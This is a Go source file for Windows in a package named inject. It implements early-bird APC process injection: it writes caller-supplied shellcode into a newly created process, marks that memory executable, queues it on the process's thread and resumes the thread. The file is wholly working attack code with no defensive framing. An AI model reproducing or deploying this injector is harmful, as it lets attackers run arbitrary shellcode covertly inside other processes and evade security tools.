// +build windows

package inject

import (
	"fmt"
	"log"
	"unsafe"

	"golang.org/x/sys/windows"
)

func QueueUserAPC(shellcode []byte) {
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	virtualAllocEx := kernel32.NewProc("VirtualAllocEx")
	virtualProtectEx := kernel32.NewProc("VirtualProtectEx")
	writeProcessMemory := kernel32.NewProc("WriteProcessMemory")
	queueUserAPC := kernel32.NewProc("QueueUserAPC")
	resumeThread := kernel32.NewProc("ResumeThread")

	pi := CreateProcess()
	oldProtect := windows.PAGE_READWRITE

	lpBaseAddress, _, errVirtualAllocEx := virtualAllocEx.Call(uintptr(pi.Process), 0, uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	if errVirtualAllocEx.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("Error calling VirtualAllocEx:\r\n%s", errVirtualAllocEx.Error()))
	}

	_, _, errWriteProcessMemory := writeProcessMemory.Call(uintptr(pi.Process), lpBaseAddress, uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)), 0)
	if errWriteProcessMemory.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("Error calling WriteProcessMemory:\r\n%s", errWriteProcessMemory.Error()))
	}

	_, _, errVirtualProtectEx := virtualProtectEx.Call(uintptr(pi.Process), lpBaseAddress, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
	if errVirtualProtectEx.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("Error calling VirtualProtectEx:\r\n%s", errVirtualProtectEx.Error()))
	}

	_, _, errQueueUserAPC := queueUserAPC.Call(lpBaseAddress, uintptr(pi.Thread), 0)
	if errQueueUserAPC.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("Error calling QueueUserAPC:\r\n%s", errQueueUserAPC.Error()))
	}

	_, _, errResumeThread := resumeThread.Call(uintptr(pi.Thread))
	if errResumeThread.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("Error calling ResumeThread:\r\n%s", errResumeThread.Error()))
	}

	fmt.Println("INJECTED!")
}
